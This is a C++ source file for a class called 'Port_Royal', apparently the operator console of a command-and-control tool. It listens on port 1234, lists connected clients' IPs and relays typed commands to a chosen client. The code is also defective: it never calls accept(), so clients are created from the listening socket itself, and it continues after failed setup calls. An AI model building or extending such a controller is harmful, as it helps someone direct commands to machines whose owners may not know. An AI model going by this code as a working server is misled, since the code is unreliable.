#include "Port_Royal.hpp"

#include "../Common/Common.hpp"

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <iostream>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>

Port_Royal::Port_Royal() : m_socket_to_listen(open_port_and_listen()) {}

void Port_Royal::execute() 
{
    std::vector<Client> clients;
    struct pollfd poll_request[2];
    poll_request[0].fd = 0; //stdin
    poll_request[1].fd = m_socket_to_listen.get();
    poll_request[0].events = POLLIN;
    poll_request[1].events = POLLIN;
    fcntl(poll_request[0].fd, F_SETFL, O_NONBLOCK);
    fcntl(poll_request[1].fd, F_SETFL, O_NONBLOCK);
    while (true)
    {
        poll(poll_request, 2, -1);
        if (poll_request[0].revents == POLLIN) { // get command from user
            char* line = NULL;
            size_t size = 0;

            getline(&line, &size, stdin);
            std::string command = line;
            free(line);
            command.pop_back(); // pop \n
            if ( command == "show") {
                for (int i = 0; i < clients.size(); i++) {
                    std::cout << i << " " << clients.at(i).get_ip() << std::endl;
                }
            }
            else try {
                int target = std::stoi(command);
                clients.at(target).send_command(command.substr(command.find(' ') + 1, command.length()));
            }
            catch (const std::exception& ex) {
                std::cout << "invalid command " << std::endl;
            }
        }
        if (poll_request[1].revents == POLLIN) // connect client
        {
            clients.emplace_back(std::move(m_socket_to_listen.get()));
        }
    }
}

int Port_Royal::open_port_and_listen()
{
    struct addrinfo hints, * res;
    int sockfd;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; // use IPv4 or IPv6, whichever
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE; // fill in my IP for me

    if (getaddrinfo(NULL, "1234", &hints, &res) != 0)
        std::cout << "getaddrinfo error" << std::endl;
    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sockfd == -1)
        std::cout << "socket error" << std::endl;
    if (bind(sockfd, res->ai_addr, res->ai_addrlen) != 0)
        std::cout << "bind error" << std::endl;
    if (listen(sockfd, 10) != 0) // 10 is the maximum connected devices
        std::cout << "listen error" << std::endl;
    freeaddrinfo(res);

    return sockfd;
}